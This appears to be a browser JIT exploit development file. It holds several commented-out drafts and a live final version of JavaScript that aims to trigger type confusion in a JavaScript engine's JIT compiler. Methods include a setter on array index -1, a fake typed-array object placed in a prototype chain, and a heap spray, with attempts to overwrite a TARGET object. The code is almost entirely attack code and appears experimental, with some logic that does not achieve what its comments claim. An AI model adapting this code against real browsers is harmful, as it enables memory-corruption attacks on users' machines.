/* v2
const NUM_ITERATIONS = 10;
const ARRAY_LENGTH = 1000;

let arr1 = [];
let arr2 = [1.1, 2.2, , 4.4];
let TARGET = { secret: 0x12345678 };

arr2.__defineSetter__("-1", function(x) {
    alert('Setter called on -1, deleting arr1.x');
    delete arr1.x;
});

function f(b, index, target) {
    let ai = { x4: 42 };
    let aT = { x4: 1337 };
    arr1.x = ai;
    if (b) arr1.x = aT;
    arr2[index] = 1.1;
    try {
        let result = arr1.x.x4;
        alert('Result of arr1.x.x4 = ' + result);
    } catch (e) {
        alert('Crash or Type Confusion: ' + e);
    }
    if (index === -1 && target) {
        arr1.x = target; // محاولة كتابة قيمة جديدة
    }
    return arr1.x ? arr1.x.x4 : null;
}

function main() {
    for (let i = 0; i < NUM_ITERATIONS; i++) {
        arr2.length = 4;
        f((i & 1) === 1, 5, null);
    }
    f(true, -1, TARGET); // Trigger with TARGET
    alert('Final arr1.x.x4 = ' + (arr1.x ? arr1.x.x4 : 'undefined'));
    alert('TARGET.secret = ' + TARGET.secret);
}

main();
*/

/* v1
// Set this to 10 or so to see correct result
const NUM_ITERATIONS = 10;
const ARRAY_LENGTH = 100;

let OBJ = { a: 41 };
// Need to change property once or IonMonkey
// will assume it's a constant.
OBJ.a = 42;

let ctr = 0;

function f(obj, idx) {
    let v = OBJ.a;
    obj[idx] = v;

    // In the last iteration, the JIT code will get here without
    // bailing out while the StoreElementHole operation above
    // unexpectedly invoked a setter because idx -1 is a property.
    // As the compiler didn't expect side effects, it does not
    // refetch OBJ.a and so returns an incorrect result.
    // Causing type confusions is left as an exercise ;)
    return OBJ.a;
}

function main() {
    for(let i = 0; i < NUM_ITERATIONS; i++) {
        let isLastIteration = i == NUM_ITERATIONS - 1;
        let length = ARRAY_LENGTH;
        let idx = isLastIteration ? -1 : ARRAY_LENGTH;
        let obj = new Array(length);
        Object.defineProperty(obj, '-1', {
            set() {
                alert('Setter called, setting OBJ.a to 1337');
                OBJ.a = 1337;
            }
        });

        for (let j = 0; j < length; j++) {
            // Array must not be packed or else a flag change
            // (indicating non-packed elements) will cause
            // invalidation in the last iteration.
            if (j == length/2) {
                continue;
            }
            obj[j] = j;
        }

        let r = f(obj, idx);
        alert('Result: ' + r);
    }
}

main();
*/

/* v3
// Run with increased iterations for JIT compilation
const NUM_ITERATIONS = 1000;
const v4 = [{a: 0}, {a: 1}, {a: 2}, {a: 3}, {a: 4}];
let ab = new ArrayBuffer(0x1000);
let x = {buffer: ab, length: 13.39, byteOffset: 13.40, data: 3.54484805889626e-310};
let y = new Uint32Array(ab);
let TARGET = { secret: 0x12345678 };

function v7(v8, v9) {
    if (v4.length == 0) {
        v4[3] = y;
        alert('v4[3] set to y');
    }
    const v11 = v4.pop();
    try {
        v11[0] = 0x1337; // محاولة الكتابة
        alert('Write to v11[0] succeeded with value: ' + v11[0]);
    } catch (e) {
        alert('Crash or Type Confusion: ' + e);
    }
    for (let v15 = 0; v15 < 100; v15++) {} // Force JIT
}

var p = {};
p.__proto__ = [y, y, y];
p[0] = x;
v4.__proto__ = p;

function main() {
    for (let v31 = 0; v31 < NUM_ITERATIONS; v31++) {
        v7();
    }
    alert('TARGET.secret = ' + TARGET.secret);
}

main();
*/

/* v4
// Run with increased iterations for JIT compilation
const NUM_ITERATIONS = 5;
const v4 = [{a: 0}, {a: 1}, {a: 2}, {a: 3}, {a: 4}];
let ab = new ArrayBuffer(0x1000);
let x = {buffer: ab, length: 13.39, byteOffset: 13.40, data: 3.54484805889626e-310};
let y = new Uint32Array(ab);
let TARGET = { secret: 0x12345678 };

function v7(v8, v9) {
    if (v4.length == 0) {
        v4[3] = y;
        alert('v4[3] set to y');
    }
    const v11 = v4.pop();
    try {
        v11[0] = 0x1337; // محاولة الكتابة
        alert('Write to v11[0] succeeded with value: ' + v11[0].toString(16)); // عرض سداسي
        // محاولة كتابة في TARGET
        v11[1] = TARGET; // محاولة كتابة كائن
    } catch (e) {
        alert('Crash or Type Confusion: ' + e);
    }
    // قراءة للتحقق
    try {
        let readValue = v11[0];
        alert('Read from v11[0] = ' + readValue.toString(16));
    } catch (e) {
        alert('Read failed: ' + e);
    }
    for (let v15 = 0; v15 < 100; v15++) {} // Force JIT
}

var p = {};
p.__proto__ = [y, y, y];
p[0] = x;
v4.__proto__ = p;

function main() {
    for (let v31 = 0; v31 < NUM_ITERATIONS; v31++) {
        v7();
    }
    alert('TARGET.secret = ' + TARGET.secret);
    alert('y[0] = ' + y[0].toString(16)); // تحقق من ArrayBuffer
}

main();
*/



// Run with reduced iterations for easier monitoring
const NUM_ITERATIONS = 5;
const SPRAY_SIZE = 100000; // زيادة لتلاعب الذاكرة
const v4 = [{a: 0}, {a: 1}, {a: 2}, {a: 3}, {a: 4}];
let ab = new ArrayBuffer(0x1000);
let x = {buffer: ab, length: 13.39, byteOffset: 13.40, data: 3.54484805889626e-310};
let y = new Uint32Array(ab);
let TARGET = { secret: 0x12345678 };

// Heap Spray لملء الذاكرة
let spray = new Array(SPRAY_SIZE).fill({ data: y });

function v7(v8, v9) {
    if (v4.length == 0) {
        v4[3] = y;
        alert('v4[3] set to y');
    }
    const v11 = v4.pop();
    try {
        v11[0] = 0x1337; // محاولة الكتابة
        alert('Write to v11[0] succeeded with value: ' + v11[0].toString(16));
        v11[1] = TARGET; // محاولة كتابة TARGET
    } catch (e) {
        alert('Crash or Type Confusion: ' + e);
    }
    try {
        let readValue = v11[0];
        alert('Read from v11[0] = ' + readValue.toString(16));
    } catch (e) {
        alert('Read failed: ' + e);
    }
    for (let v15 = 0; v15 < 100; v15++) {} // Force JIT
}

var p = {};
p.__proto__ = [y, y, y];
p[0] = x;
v4.__proto__ = p;

function main() {
    for (let v31 = 0; v31 < NUM_ITERATIONS; v31++) {
        v7();
    }
    alert('TARGET.secret = ' + TARGET.secret);
    alert('y[0] = ' + y[0].toString(16)); // تحقق من ArrayBuffer
}

main();